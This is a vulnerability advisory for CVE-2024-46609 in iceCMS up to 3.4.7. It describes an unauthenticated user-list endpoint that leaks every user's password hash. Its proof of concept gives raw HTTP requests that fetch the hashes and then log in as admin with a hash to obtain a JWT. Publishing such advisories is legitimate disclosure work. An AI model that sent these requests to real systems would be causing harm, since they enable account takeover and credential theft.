
**[CVE-ID]**
CVE-2024-46609

**[PRODUCT]**
icecms

**[Vendor of Product]**
https://github.com/Thecosy/iceCMS?tab=readme-ov-file

**[VERSION]**
icecms <=3.4.7

**[Vulnerability Type]**
Incorrect Access Control

**[Description]**
Unauthorized acquisition of all user passwords.
The vulnerability is in the CheckVip function in UserController.java. The route of this function is @GetMapping("/getUserList/{page}/{limit}"). This interface does not perform authentication processing, resulting in attackers being able to directly request this interface to obtain the information of all users, including passwords.
![pic0](/icecms/PIC/CVE-2024-46609-0.png)



## POCï¼š

Use Burpsuite to send the login data packet as follows. 
Through this interface, encrypted passwords of all users can be obtained without authorization.
```
GET /User/getUserList/1/50 HTTP/1.1
Host: localhost:8181
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:9528
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:9528/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 2

```

![pic1](/icecms/PIC/CVE-2024-46609-1.png)


Then, the interface /UserLog/loginAdmin can be used to log in through the encrypted password, thereby obtaining the jwt authentication information of the user.
```
GET /UserLog/loginAdmin?username=admin&password=$argon2i$v=19$m=65536,t=3,p=1$Bd4DS8mtP2ZM3DInyCT/sg$pQixU/obFvmj9wZXu658pZ4G5epINkfdET17xx8X3R8 HTTP/1.1
Host: localhost:8181
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?0
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwic3ViIjoiMyIsImV4cCI6MTcyNzA4MjY1MywianRpIjoiYWQ5NDQ5OTgtYTFmNy00YWZlLWI4N2MtNDQ2NGI0OTI4YTgzIn0.MrUf_EPqXasTngKjkdkXg9WOeso8yhMs1mGxrKnwYPc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://192.168.110.175:9528
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://192.168.110.175:9528/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

![pic2](/icecms/PIC/CVE-2024-46609-2.png)

